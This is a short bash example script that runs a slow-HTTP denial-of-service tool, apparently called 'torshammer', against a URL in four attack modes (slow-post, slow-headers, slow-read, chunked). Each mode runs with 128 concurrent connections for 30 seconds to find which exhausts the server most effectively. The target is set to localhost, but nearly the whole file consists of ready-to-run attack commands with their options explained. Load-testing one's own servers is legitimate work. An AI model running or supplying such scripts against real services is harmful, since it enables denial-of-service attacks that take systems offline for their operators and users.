#!/bin/bash
# Example: Testing all four attack modes
# ======================================
# This script demonstrates how to test a target using each of the
# four available attack modes to identify which is most effective.

TARGET_URL="http://localhost:8080"

echo "Testing all attack modes against $TARGET_URL"
echo "=============================================="
echo ""

# Mode 1: slow-post (default)
# Sends POST data very slowly to keep connections open
echo "1. Testing slow-post mode..."
torshammer -u "$TARGET_URL" -m slow-post -c 128 -d 30
echo ""

# Mode 2: slow-headers
# Sends HTTP headers very slowly
echo "2. Testing slow-headers mode..."
torshammer -u "$TARGET_URL" -m slow-headers -c 128 -d 30
echo ""

# Mode 3: slow-read
# Opens connections and reads responses very slowly
echo "3. Testing slow-read mode..."
torshammer -u "$TARGET_URL" -m slow-read -c 128 -d 30
echo ""

# Mode 4: chunked
# Uses chunked transfer encoding with slow chunk delivery
echo "4. Testing chunked mode..."
torshammer -u "$TARGET_URL" -m chunked -c 128 -d 30
echo ""

echo "All modes tested. Review the results to see which was most effective."

# Explanation:
# -m: Attack mode (slow-post, slow-headers, slow-read, chunked)
# -c: Number of concurrent connections (reduced to 128 for testing)
# -d: Duration in seconds (30 seconds per mode for quick testing)
